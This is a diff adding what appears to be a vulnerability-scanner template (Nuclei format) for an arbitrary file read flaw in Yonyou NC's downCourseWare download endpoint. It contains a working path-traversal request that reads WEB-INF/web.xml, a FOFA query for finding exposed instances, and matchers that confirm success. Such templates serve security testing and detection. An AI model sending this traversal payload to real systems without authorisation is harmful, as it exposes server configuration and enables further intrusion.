@@ -1,0 +1,31 @@
+id: yonyou-nc-downCourseWare-fileread
+
+info:
+  name: 用友NC downCourseWare任意文件读取
+  author: onewin
+  severity: high
+  description: 用友NC downCourseWare任意文件读取
+  metadata:
+    fofa-query: title=="YONYOU NC"
+  tags: yonyou,fileread
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /portal/pt/downCourseWare/download?fileName=../webapps/nc_web/WEB-INF/web.xml&pageId=login  HTTP/1.1
+    Host: {{Hostname}}
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "web-app"
+        part: body
+
+
